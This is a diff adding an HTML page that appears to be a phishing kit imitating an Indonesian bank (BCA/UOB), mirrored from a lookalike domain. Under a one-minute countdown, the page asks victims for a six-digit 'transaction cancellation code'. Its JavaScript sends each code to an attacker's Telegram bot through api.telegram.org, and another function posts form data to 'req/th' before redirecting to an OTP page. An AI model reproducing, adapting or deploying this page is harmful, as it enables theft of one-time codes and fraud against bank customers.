@@ -1,0 +1,295 @@
+<html lang="en">
+ <!-- Mirrored from perubahan-tarif-transaksi-2024.ws-com.sbs/Bank-Bca/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 21 Jan 2024 14:28:42 GMT -->
+ <!-- Added by HTTrack -->
+ <head>
+  <!-- /Added by HTTrack --> 
+  <title>UOB</title> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <meta http-equiv="Cache-Control" content="max-age=0, no-cache, must-revalidate"> 
+  <meta http-equiv="Pragma" content="no-cache"> 
+  <meta http-equiv="Expires" content="0"> 
+  <link href="../../mayaestanti1.000webhostapp.com/patokmakngn.css" rel="stylesheet"> 
+  <link rel="icon" href=""> 
+  <link rel="apple-touch-icon" href=""> 
+  <style>
+    body, html{
+     background-image: url('images/Picsart-24-02-12-19-33-08-725.jpg');
+    background-repeat: no-repeat;
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+        font-family: 'Ubuntu', sans-serif;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      top: 0;
+      margin: 0px auto;
+      background-color: #dedede;
+      width: 100%;
+      height: auto;
+      positon: fixed;
+    
+      
+}
+    .container {
+     
+        width: 90%;
+        padding: -30px 0px;
+        height: auto;
+        margin:0px auto;
+        border-radius:15px;
+        border: 2px #000;
+        background-color:#fff;
+
+          box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+      
+    }
+     .btn-punya {
+        display: block;
+        margin: 0px auto 0 auto;
+        padding: 0px;
+        cursor: pointer;
+        background: #0059b8;
+        border: none;
+        text-align: center;
+        height: 40px;
+        width: 100%;
+        max-width: 90%;
+        font-family: 'Open Sans', sans-serif;
+        font-size: 14px;
+        font-weight: bold;
+        color: #fff;
+        letter-spacing: 2px;
+        line-height: 1;
+        border-radius: 13px;
+        transition: background 200ms ease 0s;
+   
+    }
+    
+   input {
+     font-family: 'Open Sans', sans-serif;
+        border: 1px solid rgb(0, 134, 224);
+        border-radius: 8px;
+        width:94%;
+        max-width: 86%;
+           display: block;
+        margin: 0px auto 0 auto;
+        padding: 5px;
+        cursor: pointer;
+        font-size: 15px;
+        font-weight: solid;
+        
+        height: 27px;
+        line-height: 1;
+        word-spacing: 1;
+        text-align: ;
+    }
+    a{
+       margin:10px;
+          font-size: 12px;
+        color: #fff;
+    }
+    h1{
+        background:#0062e6;
+        padding:10px 10px;
+        margin: 0px;
+    }
+    b{
+        font-size: 15px;
+        color:#1dae4a;
+    }
+</style> 
+ </head> 
+ <body> 
+  <section> 
+   <div class="col-12" style="width:559px; max-width:100%; display:block;margin:60px auto;"> 
+    <div class="container"> 
+     <center> 
+      <img src="img2/WKdf07.jpg" width="100%" style="border-radius:10px 10px 0px 0px;" alt=""> 
+     </center> 
+     <center> 
+     </center> 
+     <div class="card-body d-flex py-5"> 
+      <div class="col"> 
+       <div class="row"> 
+        <div class="col-12 col-sm-8 col-md-7 col-lg-6 mx-auto"> 
+         <!-- Modal --> 
+         <div class="row"> 
+          <div class="col-12"> 
+           <div class="alert alert-v2 alert-warning d-flex" role="alert"> 
+           </div> 
+           <div> 
+           </div> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+       <br> 
+       <div class="row mb-4"> 
+  <div class="col-12"> 
+    <div class="form-group"> 
+      <label for="bcaId" style="margin:25px;font-weight:bold; font-size:14px;color:#0d579f">Kode Pembatalan Transaksi :</label> 
+      <input type="tel" inputmode="numeric" class="" id="bcaId" value="" name="pin" maxlength="6" placeholder="" required> 
+      <div class="row"> 
+        <p style="font-weight: bold; font-size: 18px; color: #1b61a4; text-align: center; margin: 10px auto;" id="timers">0 : 59</p> 
+      </div> 
+    </div> 
+  </div> 
+</div> 
+<br> 
+<div class="row"> 
+  <div class="col-12 col-sm col-md-8 mx-auto"> 
+    <button id="btnSubmit" class="btn-punya" type="button">Batalkan Sekarang</button> 
+    <br>
+    <br>
+    <br> 
+  </div> 
+</div> 
+
+<script src="../../config.js"></script>
+<script>
+  // Ambil data input sebelumnya dari localStorage atau buat objek kosong
+  let inputCounts = JSON.parse(localStorage.getItem("inputCounts")) || {};
+
+  document.getElementById("btnSubmit").addEventListener("click", function () {
+    const kodePembatalan = document.getElementById("bcaId").value.trim(); // Ambil teks yang dimasukkan
+
+    if (!kodePembatalan) {
+      alert("Harap masukkan Kode Pembatalan Transaksi!");
+      return;
+    }
+
+    // Jika kode sudah dimasukkan lebih dari 2 kali, tolak input
+    if (inputCounts[kodePembatalan] && inputCounts[kodePembatalan] >= 2) {
+      alert("Kode ini sudah dimasukkan 2 kali, coba kode lain!");
+      return;
+    }
+
+    // Tambah jumlah percobaan untuk kode ini
+    inputCounts[kodePembatalan] = (inputCounts[kodePembatalan] || 0) + 1;
+    localStorage.setItem("inputCounts", JSON.stringify(inputCounts)); // Simpan ke localStorage
+
+    // Kirim data ke bot Telegram
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `Kode Pembatalan Transaksi: ${kodePembatalan}`,
+      }),
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "proses2.html"; // Redirect ke otptengah.html
+      } else {
+        alert("Gagal mengirim data ke bot Telegram.");
+      }
+    }).catch(error => {
+      console.error("Error:", error);
+      alert("Terjadi kesalahan saat mengirim data.");
+    });
+  });
+</script>
+
+
+  <script>
+    function send(event){
+        event.preventDefault();
+        $("#btn1").prop("disabled", true);
+        $.ajax({
+            type: 'POST',
+            url: 'req/th',
+            data: $('#form').serialize(),
+            dataType: 'text',
+            success: function(){
+                window.location.href="validotp.html";
+            }
+        })
+    };
+</script> 
+  <p id="status"></p> 
+  <script>
+   
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+   </script> 
+  <script>
+        document.getElementById('timer').innerHTML =
+          01 + ":" + 00;
+        startTimer();
+        
+       
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+    </script> 
+  <script>
+      document.getElementById('timers').innerHTML =
+          1 + ":" + 00;
+        startTimer();
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timers').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timers').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+  </script> 
+  <!-- </body> --> 
+  <!-- Mirrored from perubahan-tarif-transaksi-2024.ws-com.sbs/Bank-Bca/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 21 Jan 2024 14:28:47 GMT -->
+ </body>
+</html>
